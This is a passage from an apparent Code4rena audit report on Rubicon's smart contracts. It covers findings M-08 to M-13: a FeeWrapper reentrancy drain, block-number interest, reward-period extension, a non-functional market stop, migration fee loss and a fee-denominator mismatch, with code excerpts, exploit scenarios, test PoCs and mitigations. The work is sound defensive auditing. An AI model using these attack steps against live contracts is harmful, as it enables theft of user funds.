            keccak256(abi.encodePacked(pay_gem, buy_gem)),
            msg.sender,
            pay_gem,
            buy_gem,
            uint128(pay_amt),
            uint128(buy_amt)
        );
    }
```

As you can see, it is also applied in the other offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835).

       require(_dust[address(pay_gem)] <= pay_amt);

### Recommended Mitigation Steps

Add the check condition below to the `offer` function that called the `make` function:

       require(_dust[address(pay_gem)] <= pay_amt);

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1167#issuecomment-1532584249)**

***

## [[M-08] REENTRANCY ATTACK POSSIBLE IF THE `_feeTo` IS A MALICIOUS CONTRACT IN `FeeWrapper._chargeFeePayable()` FUNCTION](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1166)
*Submitted by [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1166), also found by [0xkazim](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1239), [pipoca](https://github.com/code-423n4/2023-04-rubicon-findings/issues/889), [0xNineDec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/495) and [0xnacho](https://github.com/code-423n4/2023-04-rubicon-findings/issues/210)*.

Reentrancy attack could happen if `_feeTo` is a `malicious` contract and has `recieve()` function implemented in `_feeTo` contract. `FeeWrapper._chargeFeePayable()` function is used to send the `_feeAmount` of ETH to the `_feeTo` address.

Consider that `FeeWrapper._chargeFeePayable()` is called by the `FeeWrapper._rubicallPayable()` function with the necessary `_feeParams` input parameter, and the following scenario can occur:

1. The call to `(bool OK, ) = payable(_feeTo).call{value: _feeAmount}("")` is made. Lets assume the `_totalAmount` = 1ETH and `_feeAmount` = 0.1ETH initially.
2. `_feeTo` contract has the `recieve()` function implemented in it.
3. It reenters the `FeeWrapper` contract by calling the `rubicallPayable()` function by sending 0.01ETH as `msg.value`.
4. It sets the `_feeParams.totalAmount` =  0.01ETH and `_feeParams.feeAmount` = 0.1ETH in the call to `rubicallPayable()`.
5. `FeeWrapper.chargeFeePayable()` will be called again by the `rubicallPayable()` function.
6. `(bool OK, ) = payable(_feeTo).call{value: _feeAmount}("")`; will be called and `Tx will pass` since there is enough ETH in the contract from the previous deposit.
7. Again `_feeParams.feeAmount` = 0.1ETH will be transferred to the `_feeTo` address.
8. This can be continued till there is enough ETH in the contract.
9. This happens as there is `no check` to make sure `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address.

### Proof of Concept

    function _chargeFeePayable(
        FeeParams memory _feeParams
    ) internal returns (uint256 _msgValue) {
        // _feeToken is ETH
        uint256 _totalAmount = _feeParams.totalAmount;
        uint256 _feeAmount = _feeParams.feeAmount;
        address _feeTo = _feeParams.feeTo;
        require(msg.value == _totalAmount, "FeeWrapper: not enough ETH sent");

        // transfer fee to the 3rd party protocol
        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}("");
    	require(OK, "ETH transfer failed");
        _msgValue = msg.value - _feeAmount;
    }

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121>

    function _rubicallPayable(
        CallParams memory _params
    ) internal returns (bytes memory) {
        // charge fee from feeParams
        uint256 _msgValue = _chargeFeePayable(_params.feeParams);

        (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(
            bytes.concat(_params.selector, _params.args)
        );

        require(_OK, "low-level call to the router failed");

        return _data;
    }

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89>

### Tools Used

Manual Review and VSCode

### Recommended Mitigation Steps

Two options can be recommended to mitigate this issue:

1.  Add a reentrancy guard. `Openzeppelin` `ReentrancyGuard.sol` can be used, and `nonReentrant` modifier can be added to both `FeeWrapper._chargeFeePayable()` and `FeeWrapper._rubicallPayable()` functions.

2.  Check that the `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address is made. In that case, there is no gain to the `_feeTo` malicious contract, since the value it's sending via `msg.value` is always greater than the `_feeAmount` which can be stolen via `reentrancy attack`.

**[daoio (Rubicon) confirmed via duplicate issue #495](https://github.com/code-423n4/2023-04-rubicon-findings/issues/495#issuecomment-1535690160)**

***

## [[M-09] Use of `block.number` leads to incorrect interest calculations](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1141)
*Submitted by [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1141), also found by [0xkazim](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1269), [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1212), [VAD37](https://github.com/code-423n4/2023-04-rubicon-findings/issues/919) and [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/257)*.

The interests that need to be paid upon closing a position are computed as follows:

```solidity
File: contracts/utilities/poolsUtility/Position.sol
322: function _calculateDebt(
323:         address _bathToken,
324:         uint256 _startBlock,
325:         uint256 _borrowedAmount
326:     ) internal view returns (uint256 _debt) {
327:         uint256 _blockDelta = block.number - _startBlock;
328: 
329:         uint256 _interest = (
330:             (_borrowedAmount).mul(borrowRate(_bathToken).mul(_blockDelta))
331:         ).div(10 ** 18);
332:         _debt = _borrowedAmount.add(_interest);
333:     }
```

The interest rate is computed using the block delta, between `block.number` and the starting block.

The issue is that the block production on Optimism is currently [not fixed](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps):

    each transaction on L2 is placed in a separate block and blocks are NOT produced at a constant rate

### Proof of Concept

Run the following command several times in the repo, using an optimism rpc url:

```
cast block-number --rpc-url YOUR_OPTIMISM_RPC_URL
```

You will see that the blocks are not produced at a constant rate.

### Impact

Interest rates are currently manipulable and will result in users having to repay more interest than expected upon closing positions.

### Mitigation

Use `block.timestamp` instead of `block.number` for interest calculation. It will involve a lot of refactoring as the `Compound` contracts `bathToken` currently inherits from using a "per block" system.

**[daoio (Rubicon) acknowledged via duplicate issue #1212](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1212#issuecomment-1547330521)**

**[HickupHH3 (judge) commented via duplicate issue #1212](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1212#issuecomment-1577842769):**
>This issue is dependent on how the `borrowRatePerBlock` (and supply rate) is configured.
>
>If there's proof that the sponsor configures it with the assumption that each block is produced every 12s on mainnet, then it's High severity. On the other hand, if it can be shown that they have configured the rates to be compatible with Optimism & Arbitrum, then it's a low issue.
>
>Considering it to be Medium severity because of this external requirement.

***

## [[M-10] Incorrect reward duration extension in notifyRewardAmount function](https://github.com/code-423n4/2023-04-rubicon-findings/issues/907)
*Submitted by [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/907), also found by [J4de](https://github.com/code-423n4/2023-04-rubicon-findings/issues/230)*.

This issue can lead to extending the reward duration beyond the intended time period, causing rewards to be distributed over a longer duration than initially planned. This could result in users receiving smaller rewards over time, which may not align with the project's goals or user expectations.

### Proof of Concept

The `notifyRewardAmount` function updates the reward rate and the period finish time for a given rewards token.

It first checks if the current block timestamp is greater than or equal to the period finish time for the given rewards token. If the reward period has passed, the reward rate is set by dividing the `reward` amount by the `rewardsDuration` for the rewards token. If the reward period has not yet passed, the remaining time and the leftover reward amount are calculated based on the current reward rate. The new reward rate is then set by adding the leftover amount to the new reward amount and dividing by the `rewardsDuration`.

Finally, the function then updates the `lastUpdateTime` for the rewards token to the current block timestamp and increments the `periodFinish` time by adding the `rewardsDuration`.

This means if there's an ongoing reward duration and its halfway done, adding new rewards will automatically increase the reward duration by the initial time period.

```solidity
        // @audit always increments 
        periodFinish[address(rewardsToken)] = block.timestamp.add(
            rewardsDuration[address(rewardsToken)]
        );
```

After discussing with the sponsor, they acknowledged that this behavior was not expected.

### Recommended Mitigation Steps

Modify the `notifyRewardAmount` function to only extend the reward duration when necessary.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/907#issuecomment-1547231918)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/907#issuecomment-1558419471):**
 > > After discussing with the sponsor, they acknowledged that this behavior was not expected.
> 
> I'm quite surprised by this, given how `notifyRewardAmount()` is supposed to work when topping up rewards. It will require significant modifications to a battle-tested codebas,e which could introduce new bugs.

***

## [[M-11] Calling `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot pause any functionlities of the market](https://github.com/code-423n4/2023-04-rubicon-findings/issues/906)
*Submitted by [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/906), also found by [halden](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1272), [McToady](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1241), [JC](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1236), [karanctf](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1170), [tnevler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1100), [hunter\_w3b](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1056), [dec3ntraliz3d](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1036), [Viktor\_Cortess](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1027), [lukris02](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1011), [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/976), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/868), [Ocean\_Sky](https://github.com/code-423n4/2023-04-rubicon-findings/issues/826), [AlexCzm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/803), [R2](https://github.com/code-423n4/2023-04-rubicon-findings/issues/794), [darksnow](https://github.com/code-423n4/2023-04-rubicon-findings/issues/786), [fs0c](https://github.com/code-423n4/2023-04-rubicon-findings/issues/736), [ktg](https://github.com/code-423n4/2023-04-rubicon-findings/issues/707), [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/699), [MatricksDeCoder](https://github.com/code-423n4/2023-04-rubicon-findings/issues/697), [whoismatthewmc1](https://github.com/code-423n4/2023-04-rubicon-findings/issues/609), [Juntao](https://github.com/code-423n4/2023-04-rubicon-findings/issues/580), [Kaysoft](https://github.com/code-423n4/2023-04-rubicon-findings/issues/532), [tallo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/469), [Banditx0x](https://github.com/code-423n4/2023-04-rubicon-findings/issues/439), [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/429), [bearonbike](https://github.com/code-423n4/2023-04-rubicon-findings/issues/426), [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/421), [descharre](https://github.com/code-423n4/2023-04-rubicon-findings/issues/419), [Shubham](https://github.com/code-423n4/2023-04-rubicon-findings/issues/418), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/413), [ljmanini](https://github.com/code-423n4/2023-04-rubicon-findings/issues/392), [MalfurionWhitehat](https://github.com/code-423n4/2023-04-rubicon-findings/issues/366), [btk](https://github.com/code-423n4/2023-04-rubicon-findings/issues/246), [Dug](https://github.com/code-423n4/2023-04-rubicon-findings/issues/245), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/196), [ginlee](https://github.com/code-423n4/2023-04-rubicon-findings/issues/183), [iliyaniliev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/140), [dacian](https://github.com/code-423n4/2023-04-rubicon-findings/issues/99), [koxuan](https://github.com/code-423n4/2023-04-rubicon-findings/issues/84), [pavankv](https://github.com/code-423n4/2023-04-rubicon-findings/issues/55) and [ravikiranweb3](https://github.com/code-423n4/2023-04-rubicon-findings/issues/33)*.

Although the following `ExpiringMarket.stop` function can be called by the `RubiconMarket` contract's owner, calling it does not stop the market because `stopped` is not used at all in the protocol for pausing any of the market's functionalities.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630>

```solidity
    function stop() external auth {
        stopped = true;
    }
```

Moreover, the following `ExpiringMarket.isClosed` function always returns `false`. This means that the market cannot be closed. Since this `ExpiringMarket.isClosed` function is called in the `ExpiringMarket.can_offer` and `ExpiringMarket.can_buy` modifiers below, these modifiers' `require(!isClosed())` will always pass, and new offers and buys are always allowed. Similarly, the below `RubiconMarket.can_cancel` modifier's `require` statement's `isClosed()` check is always false so the situation, where the user wants to cancel an offer when the market is closed, does not exist at all.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622>

```solidity
    function isClosed() public pure returns (bool closed) {
        return false;
    }
```

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607>

```solidity
    /// @dev After close_time has been reached, no new offers are allowed.
    modifier can_offer() override {
        require(!isClosed());
        _;
    }

    /// @dev After close, no new buys are allowed.
    modifier can_buy(uint256 id) override {
        require(isActive(id));
        require(!isClosed());
        _;
    }
```

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729>

```solidity
    // // After close, anyone can cancel an offer
    modifier can_cancel(uint256 id) override {
        require(isActive(id), "Offer was deleted or taken, or never existed.");
        require(
            isClosed() ||
                msg.sender == getOwner(id) ||
                id == dustId ||
                (msg.sender == getRecipient(id) && getOwner(id) == address(0)),
            "Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens."
        );
        _;
    }
```

Since calling the `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot close or stop the market, the `RubiconMarket` contract's owner is unable to pause any functionlities of the market and prevented any unintended outflow and loss of user funds when an emergency occurs, such as if the protocol gets attacked and hacked.

### Proof of Concept

The following steps can occur for the described scenario.

1.  The protocol is hacked so the `RubiconMarket` contract's owner calls the `ExpiringMarket.stop` function as an attempt to pause the functionalities of the market.
2.  After the `ExpiringMarket.stop` function is called, none of the market's functionalities are paused because `stopped` is not used at all in the protocol for pausing any of the market's functionalities and the `ExpiringMarket.isClosed` function always returns `false`.
3.  As a result, the attacker can transfer user funds out from the protocol, and such user funds are lost.

### Tools Used

VSCode

### Recommended Mitigation Steps

The `ExpiringMarket.stop` function can be updated to set `stopped` to true or false by the `RubiconMarket` contract's owner. The `ExpiringMarket.isClosed` function can then be updated to return `stopped`. This enables the `RubiconMarket` contract's owner to pause and unpause the market's functionalities when needed.

**[daoio (Rubicon) acknowledged and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/906#issuecomment-1534102137):**
 > We will remove this `ExpiringMarket` stuff, keeping only `stopped` storage var.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/906#issuecomment-1558413429):**
 > Best written up report regarding impact.

***

## [[M-12] User can possess less value than before when `V2Migrator.migrate` function is called to give up `bathTokenV1` tokens and hold `bathTokenV2` tokens](https://github.com/code-423n4/2023-04-rubicon-findings/issues/904)
*Submitted by [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/904), also found by [Arz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1384), [karanctf](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1205), [0xnacho](https://github.com/code-423n4/2023-04-rubicon-findings/issues/677), [0xnev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/186), and [zaevlad](https://github.com/code-423n4/2023-04-rubicon-findings/issues/150)*.

Calling the following `V2Migrator.migrate` function executes `uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance)`.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74>

```solidity
    function migrate(IBathToken bathTokenV1) external {
        //////////////// V1 WITHDRAWAL ////////////////
        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);
        require(bathBalance > 0, "migrate: ZERO AMOUNT");

        /// @dev approve first
        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);

        // withdraw all tokens from the pool
        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);

        //////////////// V2 DEPOSIT ////////////////
        IERC20 underlying = bathTokenV1.underlyingToken();
        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];

        underlying.approve(bathTokenV2, amountWithdrawn);
        require(
            CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,
            "migrate: MINT FAILED"
        );
        /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function
        IERC20(bathTokenV2).transfer(
            msg.sender,
            IERC20(bathTokenV2).balanceOf(address(this))
        );
        ...
    }
```

Then, calling `bathTokenV1.withdraw(bathBalance)` further calls the following `BathTokenV1._withdraw` function, which executes `amountWithdrawn = r.sub(_fee)` so `amountWithdrawn` has `_fee` deducted. When `underlyingToken.safeTransfer(receiver, amountWithdrawn)` is executed, such `amountWithdrawn` is transferred to the `V2Migrator` contract.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564>

```solidity
    function _withdraw(
        uint256 _shares,
        address receiver
    ) internal returns (uint256 amountWithdrawn) {
        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);
        _burn(msg.sender, _shares);
        uint256 _fee = r.mul(feeBPS).div(10000);
        // If FeeTo == address(0) then the fee is effectively accrued by the pool
        if (feeTo != address(0)) {
            underlyingToken.safeTransfer(feeTo, _fee);
        }
        amountWithdrawn = r.sub(_fee);
        underlyingToken.safeTransfer(receiver, amountWithdrawn);
        ...
    }
```

Back in the `V2Migrator.migrate` function, `amountWithdrawn` that already has `_fee` deducted is used to call `CErc20Interface(bathTokenV2).mint(amountWithdrawn)`, and the minted `bathTokenV2` tokens are then transferred to the user. The whole migration process basically makes the user send their `bathTokenV1` tokens in exchange of the `bathTokenV2` tokens accordingly, so the value owned by the user before and after the migration should be the same. However, after deducting `_fee` from `amountWithdrawn`, which is used to mint the new `bathTokenV2` tokens, has become less than the underlying token value that is equivalent to the user's original `bathTokenV1` token balance. Although the user should own the same value either holding the `bathTokenV1` tokens before the migration or `bathTokenV2` tokens after the migration, the user is forced to pay `_fee` and possess less value than before the `V2Migrator.migrate` function is called to give up `bathTokenV1` tokens and hold `bathTokenV2` tokens. Losing value because of the migration is unfair to the user.

### Proof of Concept

The following steps can occur for the described scenario.

1.  The `bathTokenV1` tokens owned by Alice are worth 1000 USDC.
2.  Alice calls the `V2Migrator.migrate` function to migrate her `bathTokenV1` tokens to `bathTokenV2` tokens.
3.  When the `V2Migrator.migrate` function is called, a fee of 10 USDC is transferred to `feeTo` so the `bathTokenV2` tokens minted to Alice are worth only 990 USDC.
4.  As a result, Alice loses 10 USDC because of the migration, even though she should own the same value either holding the `bathTokenV1` tokens before the migration or `bathTokenV2` tokens after the migration.

### Tools Used

VSCode

### Recommended Mitigation Steps

The `BathHouse` contract corresponding to `bathHouse` used in the `BathToken V1` proxy contract can be upgraded to allow its `BathHouse.setBathTokenFeeBPS` function, which its current implementation is shown below, to be additionally callable by the `V2Migrator` contract. Then, the `V2Migrator.migrate` function can be updated to call this `BathHouse.setBathTokenFeeBPS` function to change the `BathToken V1` proxy contract's `feeBPS` to 0 before calling `bathTokenV1.withdraw(bathBalance)` and restore the `BathToken V1` proxy contract's `feeBPS` to its original value after calling `bathTokenV1.withdraw(bathBalance)`.

<https://optimistic.etherscan.io/address/0x29da5213c75a1976452a27c8054e4c65ab0a3c53#code#F1#L337>

```solidity
    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)
        external
        onlyAdmin
    {
        IBathToken(bathToken).setFeeBPS(newBPS);
    }
```

**[daoio (Rubicon) acknowledged](https://github.com/code-423n4/2023-04-rubicon-findings/issues/904#issuecomment-1547229919)**

***

## [[M-13] Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations](https://github.com/code-423n4/2023-04-rubicon-findings/issues/903)
*Submitted by [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/903), also found by [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1302), [Josiah](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1235), [Aymen0909](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1213), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1202), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1194), [teddav](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1178), [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1146), [Ruhum](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1140), [cducrest](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1103), [markus\_ether](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1071), [markus\_ether](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1054), [Nyx](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1025), [dec3ntraliz3d](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1010), [Viktor\_Cortess](https://github.com/code-423n4/2023-04-rubicon-findings/issues/996), [\_\_141345\_\_](https://github.com/code-423n4/2023-04-rubicon-findings/issues/980), [Toshii](https://github.com/code-423n4/2023-04-rubicon-findings/issues/967), [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/961), [sashik\_eth](https://github.com/code-423n4/2023-04-rubicon-findings/issues/958), [Madalad](https://github.com/code-423n4/2023-04-rubicon-findings/issues/952), [peanuts](https://github.com/code-423n4/2023-04-rubicon-findings/issues/820), [AlexCzm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/802), [R2](https://github.com/code-423n4/2023-04-rubicon-findings/issues/790), [0xfusion](https://github.com/code-423n4/2023-04-rubicon-findings/issues/789), [SpicyMeatball](https://github.com/code-423n4/2023-04-rubicon-findings/issues/788), [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/678), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/656), [xmxanuel](https://github.com/code-423n4/2023-04-rubicon-findings/issues/579), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/475), [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/455), [RaymondFam](https://github.com/code-423n4/2023-04-rubicon-findings/issues/376), [MalfurionWhitehat](https://github.com/code-423n4/2023-04-rubicon-findings/issues/337), [ljmanini](https://github.com/code-423n4/2023-04-rubicon-findings/issues/330), [volodya](https://github.com/code-423n4/2023-04-rubicon-findings/issues/221), [3agle](https://github.com/code-423n4/2023-04-rubicon-findings/issues/198), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/193), [anodaram](https://github.com/code-423n4/2023-04-rubicon-findings/issues/172), [ckksec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/158), [0xnev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/94), [dacian](https://github.com/code-423n4/2023-04-rubicon-findings/issues/86) and [volodya](https://github.com/code-423n4/2023-04-rubicon-findings/issues/40)*.

Calling the following `Position._marketBuy` function executes `uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000)`, and calling the `Position._marketSell` function below executes `uint256 _fee = _minFill.mul(_feeBPS).div(10000)` and `_fee = _payAmount.mul(_feeBPS).div(10000)`; in these `_fee` calculations, `10000` is used as the denominator.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473>

```solidity
    function _marketBuy(
        address _asset,
        address _quote,
        uint256 _maxFill
    ) internal {
        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);
        uint256 _buyAmount = rubiconMarket.getBuyAmount(
            ERC20(_asset),
            ERC20(_quote),
            _maxFill.sub(_fee)
        );
        IERC20(_quote).approve(address(rubiconMarket), _maxFill);

        rubiconMarket.buyAllAmount(
            ERC20(_asset),
            _buyAmount,
            ERC20(_quote),
            _maxFill
        );
    }
```

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511>

```solidity
    function _marketSell(
        address _asset,
        address _quote,
        uint256 _minFill
    ) internal {
        uint256 _feeBPS = rubiconMarket.getFeeBPS();
        uint256 _fee = _minFill.mul(_feeBPS).div(10000);
        uint256 _payAmount = rubiconMarket.getPayAmount(
            ERC20(_asset),
            ERC20(_quote),
            _minFill.add(_fee)
        );
        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));

        /// @dev recalculate fee in _asset form
        _fee = _payAmount.mul(_feeBPS).div(10000);

        if (_assetBalance < _payAmount) {
            IERC20(_asset).transferFrom(
                msg.sender,
                address(this),
                _payAmount.sub(_assetBalance).add(_fee)
            );
        }

        IERC20(_asset).approve(
            address(rubiconMarket),
            IERC20(_asset).balanceOf(address(this))
        );

        rubiconMarket.sellAllAmount(
            ERC20(_asset),
            _payAmount,
            ERC20(_quote),
            _minFill
        );
    }
```

When calling the `Position._marketBuy` and `Position._marketSell` functions, the following `RubiconMarket.buy` function will be eventually called. Calling the `RubiconMarket.buy` function executes `uint256 fee = mul(spend, feeBPS) / 100_000`, where `100_000`, which is not `10000`, is the denominator.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448>

```solidity
    function buy(
        uint256 id,
        uint256 quantity
    ) public virtual can_buy(id) synchronized returns (bool) {
        OfferInfo memory _offer = offers[id];
        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;

        require(uint128(spend) == spend, "spend is not an int");
        require(uint128(quantity) == quantity, "quantity is not an int");

        ///@dev For backwards semantic compatibility.
        if (
            quantity == 0 ||
            spend == 0 ||
            quantity > _offer.pay_amt ||
            spend > _offer.buy_amt
        ) {
            return false;
        }

        offers[id].pay_amt = sub(_offer.pay_amt, quantity);
        offers[id].buy_amt = sub(_offer.buy_amt, spend);

        /// @dev Fee logic added on taker trades
        uint256 fee = mul(spend, feeBPS) / 100_000;
        require(
            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),
            "Insufficient funds to cover fee"
        );
        ...
    }
```

Because the `Position._marketBuy` and `Position._marketSell` functions calculate `_fee` through dividing by `10000` but the `RubiconMarket.buy` function calculates `fee` through dividing by `100_000`, `_fee` and `fee` are different. This can cause incorrect calculations when calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function, and users can lose tokens that they are entitled to, as a result. For example, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`. Thus, since the `Position._marketBuy` function currently calculates `_fee` through dividing by `10000`, the user loses some asset tokens that they are entitled to.

### Proof of Concept

First, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000` test in the `Long positions` `describe` block in `test\hardhat-tests\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.

```
      it.only("changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000", async function () {
        const { owner, testCoin, testStableCoin, Position} =
          await loadFixture(deployPoolsUtilityFixture);

        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function
        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);

        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function
        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);

        // owner calls Position.buyAllAmountWithLeverage function
        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT,
          x1_25
        );

        // owner sends 25000000000000000000 quote tokens
        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);
        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);

        // owner receives 5624437 asset tokens
        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);
        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624437);
      });
```

Second, please update the `Position._marketBuy` function, as follows, to divide by `100_000` for the POC purpose.

```solidity
    function _marketBuy(
        address _asset,
        address _quote,
        uint256 _maxFill
    ) internal {
        /** @audit divide by 100_000 for POC purpose */
        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);
        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);
        /** */

        uint256 _buyAmount = rubiconMarket.getBuyAmount(
            ERC20(_asset),
            ERC20(_quote),
            _maxFill.sub(_fee)
        );
        IERC20(_quote).approve(address(rubiconMarket), _maxFill);

        rubiconMarket.buyAllAmount(
            ERC20(_asset),
            _buyAmount,
            ERC20(_quote),
            _maxFill
        );
    }
```

Third, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000` test in the `Long positions` `describe` block in `test\hardhat-tests\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000`. This test also demonstrates that the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.

```
      it.only("changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000", async function () {
        const { owner, testCoin, testStableCoin, Position} =
          await loadFixture(deployPoolsUtilityFixture);

        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function
        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);

        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function
        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);

        // owner calls Position.buyAllAmountWithLeverage function
        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT,
          x1_25
        );

        // owner still sends 25000000000000000000 quote tokens
        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);
